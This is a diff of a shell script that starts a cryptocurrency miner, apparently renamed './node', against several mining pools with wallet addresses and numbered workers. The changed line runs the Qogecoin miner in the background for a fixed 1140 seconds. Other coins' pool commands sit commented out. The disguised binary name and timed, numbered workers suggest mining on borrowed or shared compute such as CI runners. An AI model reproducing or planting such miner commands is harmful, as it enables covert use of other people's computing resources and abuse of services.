@@ -23,7 +23,7 @@ echo "start ${WORKER_NUMBER}"
 
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 # Qogecoin
-./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
+START=$(./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1140 )
 #./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
 # Crionic
 #./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
@@ -38,4 +38,4 @@ echo "start ${WORKER_NUMBER}"
 
 # salvium
 # ./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${WORKER_NUMBER} > try.log
-sleep 29999
+echo "done"
